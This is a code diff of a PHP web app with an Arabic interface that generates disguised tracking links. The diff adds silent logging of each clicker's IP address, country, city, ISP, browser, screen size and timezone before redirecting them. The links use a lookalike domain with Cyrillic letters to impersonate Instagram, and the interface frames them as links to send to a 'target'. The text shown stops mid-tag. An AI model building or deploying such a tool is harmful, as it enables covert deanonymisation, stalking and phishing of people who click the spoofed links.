@@ -10,15 +10,15 @@ $db->exec("CREATE TABLE IF NOT EXISTS logs (
     id INTEGER PRIMARY KEY AUTOINCREMENT, 
     code TEXT, 
     ip TEXT, 
+    country TEXT, 
+    city TEXT, 
+    isp TEXT, 
     user_agent TEXT, 
-    language TEXT, 
-    referrer TEXT, 
     screen_res TEXT, 
     timezone TEXT, 
     created_at DATETIME DEFAULT CURRENT_TIMESTAMP
 )");
 
-// دالة لجلب عنوان الـ IP الحقيقي للمستخدم حتى خلف خوادم Render الوسيطة
 function get_real_ip() {
     if (!empty($_SERVER['HTTP_X-FORWARDED-FOR'])) {
         $ips = explode(',',$_SERVER['HTTP_X-FORWARDED-FOR']);
@@ -27,33 +27,46 @@ function get_real_ip() {
     return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
 }
 
-// 1. معالجة إعادة التوجيه عند فتح الرابط المختصر
+function get_ip_details($ip) {
+    if ($ip == '127.0.0.1' || $ip == '::1' \vert{}\vert{}$ip == 'Unknown' || strpos($ip, '10.') === 0 \vert{}\vert{} strpos($ip, '192.168.') === 0) {
+        return ['country' => 'محلية / شبكة خاصة', 'city' => 'محلية', 'isp' => 'محلي'];
+    }
+    $json = @file_get_contents("http://ip-api.com/json/" . $ip);
+    $data = json_decode($json, true);
+    if ($data && isset($data['status']) &&$data['status'] == 'success') {
+        return [
+            'country' => $data['country'] ?? 'غير معروف',
+            'city' => $data['city'] ?? 'غير معروف',
+            'isp' => $data['isp'] ?? 'غير معروف'
+        ];
+    }
+    return ['country' => 'غير معروف', 'city' => 'غير معروف', 'isp' => 'غير معروف'];
+}
+
+// 1. إعادة التوجيه والتسجيل
 if (isset($_GET['r'])) {
     $code =$_GET['r'];
-
     $stmt =$db->prepare("SELECT target_url FROM links WHERE code = ?");
     $stmt->execute([$code]);
     $link =$stmt->fetch(PDO::FETCH_ASSOC);
 
     if ($link) {$target = $link['target_url'];$ip = get_real_ip();
+        $geo = get_ip_details($ip);
         $ua =$_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
-        $lang =$_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'Unknown';
-        $ref =$_SERVER['HTTP_REFERER'] ?? 'Direct Access';
-
         $screen =$_GET['screen'] ?? 'N/A';
         $tz =$_GET['tz'] ?? 'N/A';
 
-        $logStmt =$db->prepare("INSERT INTO logs (code, ip, user_agent, language, referrer, screen_res, timezone) VALUES (?, ?, ?, ?, ?, ?, ?)");
-        $logStmt->execute([$code, $ip,$ua, $lang,$ref, $screen,$tz]);
+        $logStmt =$db->prepare("INSERT INTO logs (code, ip, country, city, isp, user_agent, screen_res, timezone) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
+        $logStmt->execute([$code,$ip, $geo['country'],$geo['city'], $geo['isp'],$ua, $screen,$tz]);
 
         header("Location: " . $target);
         exit();
     } else {
-        die("الرابط غير موجود.");
+        die("الرابط غير موجود أو انتهت صلاحيته.");
     }
 }
 
-// 2. إنشاء رابط تتبع جديد
+// 2. إنشاء رابط جديد باستخدام النطاق المطلوب
 $generated_link = "";
 $tracking_code = "";
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
@@ -67,10 +80,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
     $stmt->execute([$code,$target_url]);
 
     $tracking_code =$code;
-    $generated_link = "https://www.instаgrаm.com.com/?r=" . $code;
+    $generated_link = "https://www.instаgrаm.com/?r=" . $code;
 }
 
-// 3. تصفية وعرض السجلات
+$total_links =$db->query("SELECT COUNT(*) FROM links")->fetchColumn();
+$total_visits =$db->query("SELECT COUNT(*) FROM logs")->fetchColumn();
+
 $filter_code = trim($_GET['track'] ?? '');
 if (!empty($filter_code)) {
     $stmt =$db->prepare("SELECT * FROM logs WHERE code = ? ORDER BY id DESC");
@@ -86,21 +101,7 @@ if (!empty($filter_code)) {
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hello World from azez</title>
-    <style>
-        body { font-family: Arial, sans-serif; background: #1a1a24; color: #e1e1e6; margin: 0; padding: 20px; direction: rtl; }
-        .container { max-width: 900px; margin: 0 auto; }
-        .card { background: #242432; padding: 25px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); margin-bottom: 20px; }
-        h1, h2 { color: #4da6ff; margin-top: 0; }
-        input[type="text"] { width: 75%; padding: 12px; border: 1px solid #3b3b4f; border-radius: 6px; background: #12121a; color: #fff; font-size: 15px; }
-        button, input[type="submit"] { background: #0088cc; color: white; border: none; padding: 12px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; font-size: 15px; }
-        button:hover, input[type="submit"]:hover { background: #006699; }
-        .result-box { background: #12121a; border-right: 4px solid #0088cc; padding: 15px; margin-top: 15px; border-radius: 4px; word-break: break-all; }
-        table { width: 100%; border-collapse: collapse; margin-top: 15px; font-size: 13px; }
-        th, td { border: 1px solid #33334d; padding: 10px; text-align: center; }
-        th { background: #0088cc; color: white; }
-        tr:nth-child(even) { background: #1d1d29; }
-        .badge { background: #28a745; color: white; padding: 3px 7px; border-radius: 4px; font-size: 11px; }
-    </style>
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const redirectCode = urlParams.get('r');
@@ -111,77 +112,46 @@ if (!empty($filter_code)) {
             const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
             window.location.href = `/?r=${redirectCode}&screen=${encodeURIComponent(screenRes)}&tz=${encodeURIComponent(tz)}`;
         }
+
+        function copyToClipboard(text, btnId) {
+            navigator.clipboard.writeText(text).then(() => {
+                const btn = document.getElementById(btnId);
+                const originalText = btn.innerText;
+                btn.innerText = "تم النسخ! ✓";
+                btn.classList.add("bg-green-600");
+                setTimeout(() => {
+                    btn.innerText = originalText;
+                    btn.classList.remove("bg-green-600");
+                }, 2000);
+            });
+        }
     </script>
 </head>
-<body>
-    <div class="container">
-        <h1>Hello World from azez</h1>
-
-        <!-- إنشاء رابط -->
-        <div class="card">
-            <h2>إنشاء رابط تتبع جديد</h2>
-            <form method="POST">
-                <input type="text" name="target_url" placeholder="أدخل الرابط الأصلي (مثل youtube.com)" required>
-                <input type="submit" name="create" value="إنشاء الرابط">
-            </form>
-
-            <?php if (!empty($generated_link)): ?>
-                <div class="result-box">
-                    <p><strong>رابط التتبع (إرساله للهدف):</strong><br>
-                    <a href="<?php echo $generated_link; ?>" target="_blank" style="color: #4da6ff;"><?php echo $generated_link; ?></a></p>
-                    <p><strong>كود التتبع الخاص بك:</strong> <span class="badge"><?php echo $tracking_code; ?></span></p>
-                    <p><a href="/?track=<?php echo $tracking_code; ?>" style="color: #28a745;">عرض السجلات الخاصة بهذا الكود فقط</a></p>
-                </div>
-            <?php endif; ?>
-        </div>
-
-        <!-- قسم البحث والتتبع حسب الكود -->
-        <div class="card">
-            <h2>البحث في السجلات (تتبع حسب الكود)</h2>
-            <form method="GET" style="margin-bottom: 15px;">
-                <input type="text" name="track" placeholder="ضع كود التتبع هنا (مثال: c45811a)..." value="<?php echo htmlspecialchars($filter_code); ?>" style="width: 65%;">
-                <button type="submit">بحث</button>
-                <a href="/" style="color: #aaa; margin-right: 10px; font-size: 13px;">عرض الكل</a>
-            </form>
-
-            <h3>سجلات الزيارات (<?php echo empty($filter_code) ? "الكل" : "للكود: " . htmlspecialchars($filter_code); ?>)</h3>
-            <div style="overflow-x: auto;">
-                <table>
-                    <thead>
-                        <tr>
-                            <th>#</th>
-                            <th>الكود</th>
-                            <th>عوان IP الحقيقي</th>
-                            <th>المنطقة الزمنية</th>
-                            <th>الشاشة</th>
-                            <th>المتصفح / النظام</th>
-                            <th>المحيل</th>
-                            <th>الوقت</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        <?php if (empty($logs)): ?>
-                            <tr><td colspan="8">لا توجد زيارات مسجلة تطابق هذا البحث حتى الآن.</td></tr>
-                        <?php else: ?>
-                            <?php foreach ($logs as$log): ?>
-                            <tr>
-                                <td><?php echo $log['id']; ?></td>
-                                <td><span class="badge"><?php echo htmlspecialchars($log['code']); ?></span></td>
-                                <td><strong><?php echo htmlspecialchars($log['ip']); ?></strong></td>
-                                <td><?php echo htmlspecialchars($log['timezone']); ?></td>
-                                <td><?php echo htmlspecialchars($log['screen_res']); ?></td>
-                                <td style="max-width: 180px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;" title="<?php echo htmlspecialchars($log['user_agent']); ?>">
-                                    <?php echo htmlspecialchars($log['user_agent']); ?>
-                                </td>
-                                <td><?php echo htmlspecialchars($log['referrer']); ?></td>
-                                <td><?php echo htmlspecialchars($log['created_at']); ?></td>
-                            </tr>
-                            <?php endforeach; ?>
-                        <?php endif; ?>
-                    </tbody>
-                </table>
+<body class="bg-slate-950 text-slate-100 min-h-screen p-4 md:p-6">
+    <div class="max-w-6xl mx-auto space-y-6">
+        
+        <!-- Header -->
+        <header class="bg-slate-900 border border-slate-800 p-6 rounded-2xl shadow-xl flex flex-col md:flex-row justify-between items-center gap-4">
+            <div>
+                <h1 class="text-2xl md:text-3xl font-extrabold text-cyan-400">Hello World from azez</h1>
+                <p class="text-slate-400 text-sm mt-1">نظام تحديد وتتبع الروابط المتقدم</p>
             </div>
-        </div>
-    </div>
-</body>
-</html>
+            <div class="flex gap-4">
+                <div class="bg-slate-800 px-4 py-2 rounded-xl border border-slate-700 text-center">
+                    <span class="block text-xs text-slate-400">الروابط المنشأة</span>
+                    <span class="text-xl font-bold text-cyan-400"><?php echo $total_links; ?></span>
+                </div>
+                <div class="bg-slate-800 px-4 py-2 rounded-xl border border-slate-700 text-center">
+                    <span class="block text-xs text-slate-400">إجمالي النقرات</span>
+                    <span class="text-xl font-bold text-emerald-400"><?php echo $total_visits; ?></span>
+                </div>
+            </div>
+        </header>
+
+        <!-- Generator Card -->
+        <div class="bg-slate-900 border border-slate-800 p-6 rounded-2xl shadow-xl">
+            <h2 class="text-lg font-bold text-cyan-400 mb-4">🔗 إنشاء رابط تتبع جديد</h2>
+            <form method="POST" class="flex flex-col md:flex-row gap-3">
+                <input type="text" name="target_url" placeholder="أدخل الرابط المستهدف (مثال: https://youtube.com)" required 
+                    class="flex-1 bg-slate-950 border border-slate-700 rounded-xl px-4 py-3 text-slate-100 focus:outline-none focus:border-cyan-500">
+                <button type="submit" name="create" class
